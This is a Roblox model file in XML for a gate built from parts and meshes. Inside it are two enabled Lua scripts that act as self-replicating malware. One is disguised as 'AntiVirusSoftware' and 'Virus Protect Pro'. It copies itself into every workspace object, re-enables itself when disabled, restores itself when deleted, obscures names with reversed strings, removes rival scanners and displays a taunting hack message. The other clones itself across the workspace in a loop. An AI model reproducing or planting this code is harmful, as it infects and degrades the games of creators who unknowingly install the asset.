<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.emeraldolds.glados.pro/roblox.xsd" version="4">
	<External>null</External>
	<External>nil</External>
	<Item class="Model" referent="RBX0">
		<Properties>
			<CoordinateFrame name="ModelInPrimary">
				<X>0</X>
				<Y>0</Y>
				<Z>0</Z>
				<R00>1</R00>
				<R01>0</R01>
				<R02>0</R02>
				<R10>0</R10>
				<R11>1</R11>
				<R12>0</R12>
				<R20>0</R20>
				<R21>0</R21>
				<R22>1</R22>
			</CoordinateFrame>
			<string name="Name">Model</string>
			<Ref name="PrimaryPart">null</Ref>
			<bool name="archivable">true</bool>
		</Properties>
		<Item class="Part" referent="RBX1">
			<Properties>
				<bool name="Anchored">true</bool>
				<float name="BackParamA">-0.5</float>
				<float name="BackParamB">0.5</float>
				<token name="BackSurface">0</token>
				<token name="BackSurfaceInput">0</token>
				<float name="BottomParamA">-0.5</float>
				<float name="BottomParamB">0.5</float>
				<token name="BottomSurface">4</token>
				<token name="BottomSurfaceInput">0</token>
				<int name="BrickColor">5</int>
				<CoordinateFrame name="CFrame">
					<X>19.5</X>
					<Y>9.10000038</Y>
					<Z>-11.5</Z>
					<R00>0</R00>
					<R01>0</R01>
					<R02>-1</R02>
					<R10>0</R10>
					<R11>1</R11>
					<R12>-0</R12>
					<R20>1</R20>
					<R21>0</R21>
					<R22>-0</R22>
				</CoordinateFrame>
				<bool name="CanCollide">true</bool>
				<bool name="DraggingV1">false</bool>
				<float name="Elasticity">0.5</float>
				<token name="FormFactor">1</token>
				<float name="Friction">0.300000012</float>
				<float name="FrontParamA">-0.5</float>
				<float name="FrontParamB">0.5</float>
				<token name="FrontSurface">0</token>
				<token name="FrontSurfaceInput">0</token>
				<float name="LeftParamA">-0.5</float>
				<float name="LeftParamB">0.5</float>
				<token name="LeftSurface">0</token>
				<token name="LeftSurfaceInput">0</token>
				<bool name="Locked">false</bool>
				<token name="Material">256</token>
				<string name="Name">Smooth Block Model</string>
				<float name="Reflectance">0</float>
				<float name="RightParamA">-0.5</float>
				<float name="RightParamB">0.5</float>
				<token name="RightSurface">0</token>
				<token name="RightSurfaceInput">0</token>
				<Vector3 name="RotVelocity">
					<X>0</X>
					<Y>0</Y>
					<Z>0</Z>
				</Vector3>
				<float name="TopParamA">-0.5</float>
				<float name="TopParamB">0.5</float>
				<token name="TopSurface">3</token>
				<token name="TopSurfaceInput">0</token>
				<float name="Transparency">0</float>
				<Vector3 name="Velocity">
					<X>0</X>
					<Y>0</Y>
					<Z>0</Z>
				</Vector3>
				<bool name="archivable">true</bool>
				<token name="shape">1</token>
				<Vector3 name="size">
					<X>1</X>
					<Y>15.6000004</Y>
					<Z>19</Z>
				</Vector3>
			</Properties>
			<Item class="VelocityMotor" referent="RBX2">
				<Properties>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<float name="CurrentAngle">0</float>
					<float name="DesiredAngle">0</float>
					<Ref name="Hole">null</Ref>
					<float name="MaxVelocity">0</float>
					<string name="Name">ViVRuS</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Geometry" referent="RBX3">
					<Properties>
						<string name="Name">ViVRuS</string>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX4">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">AntiVirusSoftware</string>
							<ProtectedString name="Source">--[[
Virus Protect Pro! By Nomnomnom1.

Want your place virus free(finally)?
Do you want it now?
Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
			<Item class="RotateP" referent="RBX5">
				<Properties>
					<float name="BaseAngle">0.25</float>
					<CoordinateFrame name="C0">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<CoordinateFrame name="C1">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
					<Ref name="Part0">null</Ref>
					<Ref name="Part1">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Script" referent="RBX6">
					<Properties>
						<bool name="Disabled">false</bool>
						<Content name="LinkedSource"><null></null></Content>
						<string name="Name">Script......Or is it...</string>
						<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
				<Item class="Geometry" referent="RBX7">
					<Properties>
						<string name="Name">ORLY</string>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
		</Item>
		<Item class="Model" referent="RBX8">
			<Properties>
				<CoordinateFrame name="ModelInPrimary">
					<X>0</X>
					<Y>0</Y>
					<Z>0</Z>
					<R00>1</R00>
					<R01>0</R01>
					<R02>0</R02>
					<R10>0</R10>
					<R11>1</R11>
					<R12>0</R12>
					<R20>0</R20>
					<R21>0</R21>
					<R22>1</R22>
				</CoordinateFrame>
				<string name="Name">B</string>
				<Ref name="PrimaryPart">null</Ref>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="Model" referent="RBX9">
				<Properties>
					<CoordinateFrame name="ModelInPrimary">
						<X>0</X>
						<Y>0</Y>
						<Z>0</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<string name="Name">Gate</string>
					<Ref name="PrimaryPart">null</Ref>
					<bool name="archivable">true</bool>
				</Properties>
				<Item class="Part" referent="RBX10">
					<Properties>
						<bool name="Anchored">false</bool>
						<float name="BackParamA">-0.5</float>
						<float name="BackParamB">0.5</float>
						<token name="BackSurface">0</token>
						<token name="BackSurfaceInput">0</token>
						<float name="BottomParamA">-0.5</float>
						<float name="BottomParamB">0.5</float>
						<token name="BottomSurface">2</token>
						<token name="BottomSurfaceInput">0</token>
						<int name="BrickColor">194</int>
						<CoordinateFrame name="CFrame">
							<X>11.4995832</X>
							<Y>7.88832569</Y>
							<Z>-24.5083771</Z>
							<R00>9.11951065e-006</R00>
							<R01>1.05774234e-007</R01>
							<R02>-0.999999881</R02>
							<R10>-8.4498839e-005</R10>
							<R11>-1</R11>
							<R12>-1.06538209e-007</R12>
							<R20>-0.999999881</R20>
							<R21>8.4498839e-005</R21>
							<R22>-9.11951065e-006</R22>
						</CoordinateFrame>
						<bool name="CanCollide">true</bool>
						<bool name="DraggingV1">false</bool>
						<float name="Elasticity">0.5</float>
						<token name="FormFactor">2</token>
						<float name="Friction">0.300000012</float>
						<float name="FrontParamA">-0.5</float>
						<float name="FrontParamB">0.5</float>
						<token name="FrontSurface">0</token>
						<token name="FrontSurfaceInput">0</token>
						<float name="LeftParamA">-0.5</float>
						<float name="LeftParamB">0.5</float>
						<token name="LeftSurface">0</token>
						<token name="LeftSurfaceInput">0</token>
						<bool name="Locked">false</bool>
						<token name="Material">256</token>
						<string name="Name">Up</string>
						<float name="Reflectance">0</float>
						<float name="RightParamA">-0.5</float>
						<float name="RightParamB">0.5</float>
						<token name="RightSurface">0</token>
						<token name="RightSurfaceInput">0</token>
						<Vector3 name="RotVelocity">
							<X>-0.00159159454</X>
							<Y>-7.79966513e-007</Y>
							<Z>-1.43734142e-005</Z>
						</Vector3>
						<float name="TopParamA">-0.5</float>
						<float name="TopParamB">0.5</float>
						<token name="TopSurface">2</token>
						<token name="TopSurfaceInput">0</token>
						<float name="Transparency">0</float>
						<Vector3 name="Velocity">
							<X>8.92708413e-005</X>
							<Y>0.00189137319</Y>
							<Z>-0.00343421847</Z>
						</Vector3>
						<bool name="archivable">true</bool>
						<token name="shape">1</token>
						<Vector3 name="size">
							<X>1</X>
							<Y>10.8000002</Y>
							<Z>1</Z>
						</Vector3>
					</Properties>
					<Item class="SpecialMesh" referent="RBX11">
						<Properties>
							<token name="LODX">2</token>
							<token name="LODY">2</token>
							<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
							<token name="MeshType">6</token>
							<string name="Name">Mesh</string>
							<Vector3 name="Offset">
								<X>0</X>
								<Y>0</Y>
								<Z>0</Z>
							</Vector3>
							<Vector3 name="Scale">
								<X>0.5</X>
								<Y>1</Y>
								<Z>0.5</Z>
							</Vector3>
							<Content name="TextureId"><null></null></Content>
							<Vector3 name="VertexColor">
								<X>1</X>
								<Y>1</Y>
								<Z>1</Z>
							</Vector3>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
				<Item class="Model" referent="RBX12">
					<Properties>
						<CoordinateFrame name="ModelInPrimary">
							<X>0</X>
							<Y>0</Y>
							<Z>0</Z>
							<R00>1</R00>
							<R01>0</R01>
							<R02>0</R02>
							<R10>0</R10>
							<R11>1</R11>
							<R12>0</R12>
							<R20>0</R20>
							<R21>0</R21>
							<R22>1</R22>
						</CoordinateFrame>
						<string name="Name">Bars</string>
						<Ref name="PrimaryPart">null</Ref>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Part" referent="RBX13">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>11.4996738</X>
								<Y>7.88748074</Y>
								<Z>-34.5083771</Z>
								<R00>9.11951065e-006</R00>
								<R01>-1.05774234e-007</R01>
								<R02>0.999999881</R02>
								<R10>-8.4498839e-005</R10>
								<R11>1</R11>
								<R12>1.06538209e-007</R12>
								<R20>-0.999999881</R20>
								<R21>-8.4498839e-005</R21>
								<R22>9.11951065e-006</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>-0.00159159454</X>
								<Y>-7.79966513e-007</Y>
								<Z>-1.43734142e-005</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>9.70583569e-005</X>
								<Y>-0.0140245743</Y>
								<Z>-0.00343287364</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX14">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX15">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>11.4996653</X>
								<Y>7.88756466</Y>
								<Z>-33.5083771</Z>
								<R00>9.11951065e-006</R00>
								<R01>-1.05774234e-007</R01>
								<R02>0.999999881</R02>
								<R10>-8.4498839e-005</R10>
								<R11>1</R11>
								<R12>1.06538209e-007</R12>
								<R20>-0.999999881</R20>
								<R21>-8.4498839e-005</R21>
								<R22>9.11951065e-006</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>-0.00159159454</X>
								<Y>-7.79966513e-007</Y>
								<Z>-1.43734142e-005</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>9.62796039e-005</X>
								<Y>-0.0124329794</Y>
								<Z>-0.00343300775</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX16">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX17">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>11.4996557</X>
								<Y>7.88764954</Y>
								<Z>-32.5083771</Z>
								<R00>9.11951065e-006</R00>
								<R01>-1.05774234e-007</R01>
								<R02>0.999999881</R02>
								<R10>-8.4498839e-005</R10>
								<R11>1</R11>
								<R12>1.06538209e-007</R12>
								<R20>-0.999999881</R20>
								<R21>-8.4498839e-005</R21>
								<R22>9.11951065e-006</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>-0.00159159454</X>
								<Y>-7.79966513e-007</Y>
								<Z>-1.43734142e-005</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>9.55008582e-005</X>
								<Y>-0.0108413845</Y>
								<Z>-0.00343314279</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX18">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX19">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>11.4996471</X>
								<Y>7.88773346</Y>
								<Z>-31.5083771</Z>
								<R00>9.11951065e-006</R00>
								<R01>-1.05774234e-007</R01>
								<R02>0.999999881</R02>
								<R10>-8.4498839e-005</R10>
								<R11>1</R11>
								<R12>1.06538209e-007</R12>
								<R20>-0.999999881</R20>
								<R21>-8.4498839e-005</R21>
								<R22>9.11951065e-006</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>-0.00159159454</X>
								<Y>-7.79966513e-007</Y>
								<Z>-1.43734142e-005</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>9.47220906e-005</X>
								<Y>-0.00924978964</Y>
								<Z>-0.00343327597</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX20">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX21">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
							<token name="BackSurfaceInput">0</token>
							<float name="BottomParamA">-0.5</float>
							<float name="BottomParamB">0.5</float>
							<token name="BottomSurface">2</token>
							<token name="BottomSurfaceInput">0</token>
							<int name="BrickColor">194</int>
							<CoordinateFrame name="CFrame">
								<X>11.499629</X>
								<Y>7.88790321</Y>
								<Z>-29.5083771</Z>
								<R00>9.11951065e-006</R00>
								<R01>-1.05774234e-007</R01>
								<R02>0.999999881</R02>
								<R10>-8.4498839e-005</R10>
								<R11>1</R11>
								<R12>1.06538209e-007</R12>
								<R20>-0.999999881</R20>
								<R21>-8.4498839e-005</R21>
								<R22>9.11951065e-006</R22>
							</CoordinateFrame>
							<bool name="CanCollide">true</bool>
							<bool name="DraggingV1">false</bool>
							<float name="Elasticity">0.5</float>
							<token name="FormFactor">1</token>
							<float name="Friction">0.300000012</float>
							<float name="FrontParamA">-0.5</float>
							<float name="FrontParamB">0.5</float>
							<token name="FrontSurface">0</token>
							<token name="FrontSurfaceInput">0</token>
							<float name="LeftParamA">-0.5</float>
							<float name="LeftParamB">0.5</float>
							<token name="LeftSurface">0</token>
							<token name="LeftSurfaceInput">0</token>
							<bool name="Locked">false</bool>
							<token name="Material">256</token>
							<string name="Name">Snooth Block Model</string>
							<float name="Reflectance">0</float>
							<float name="RightParamA">-0.5</float>
							<float name="RightParamB">0.5</float>
							<token name="RightSurface">0</token>
							<token name="RightSurfaceInput">0</token>
							<Vector3 name="RotVelocity">
								<X>-0.00159159454</X>
								<Y>-7.79966513e-007</Y>
								<Z>-1.43734142e-005</Z>
							</Vector3>
							<float name="TopParamA">-0.5</float>
							<float name="TopParamB">0.5</float>
							<token name="TopSurface">2</token>
							<token name="TopSurfaceInput">0</token>
							<float name="Transparency">0</float>
							<Vector3 name="Velocity">
								<X>9.31645991e-005</X>
								<Y>-0.00606660033</Y>
								<Z>-0.00343354605</Z>
							</Vector3>
							<bool name="archivable">true</bool>
							<token name="shape">1</token>
							<Vector3 name="size">
								<X>1</X>
								<Y>10.8000002</Y>
								<Z>1</Z>
							</Vector3>
						</Properties>
						<Item class="SpecialMesh" referent="RBX22">
							<Properties>
								<token name="LODX">2</token>
								<token name="LODY">2</token>
								<Content name="MeshId"><url>http://www.roblox.com/asset/?id=12221344</url></Content>
								<token name="MeshType">6</token>
								<string name="Name">Mesh</string>
								<Vector3 name="Offset">
									<X>0</X>
									<Y>0</Y>
									<Z>0</Z>
								</Vector3>
								<Vector3 name="Scale">
									<X>0.5</X>
									<Y>1</Y>
									<Z>0.5</Z>
								</Vector3>
								<Content name="TextureId"><null></null></Content>
								<Vector3 name="VertexColor">
									<X>1</X>
									<Y>1</Y>
									<Z>1</Z>
								</Vector3>
								<bool name="archivable">true</bool>
							</Properties>
						</Item>
					</Item>
					<Item class="Part" referent="RBX23">
						<Properties>
							<bool name="Anchored">false</bool>
							<float name="BackParamA">-0.5</float>
							<float name="BackParamB">0.5</float>
							<token name="BackSurface">0</token>
